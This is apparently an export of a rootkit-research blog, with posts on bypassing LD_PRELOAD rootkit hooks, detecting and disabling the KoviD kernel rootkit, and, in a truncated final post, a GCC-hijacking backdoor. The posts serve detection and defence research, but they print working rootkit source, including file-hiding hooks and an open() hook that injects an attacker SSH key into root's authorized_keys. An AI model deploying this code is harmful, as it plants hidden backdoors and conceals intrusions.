[{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], 